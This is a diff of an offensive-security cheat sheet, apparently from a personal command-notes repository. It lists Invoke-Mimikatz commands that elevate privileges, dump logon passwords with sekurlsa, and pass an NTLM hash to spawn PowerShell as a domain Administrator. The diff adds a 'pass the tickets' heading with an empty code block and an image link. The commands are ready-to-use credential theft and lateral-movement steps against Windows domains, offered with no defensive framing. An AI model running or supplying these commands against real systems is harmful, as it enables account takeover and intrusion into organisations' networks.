@@ -15,3 +15,10 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 ```
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:some.domain.local /ntlm:brydaafdsafd3524frw4fe4f /run:powershell.exe"'
 ```
+
+## Mimikatz pass the tickets
+
+```
+```
+
+![image](https://github.com/Luminous-split/LifeLongCommands/assets/116489011/e7174e46-0541-4686-bbf7-17e71e3bc679)
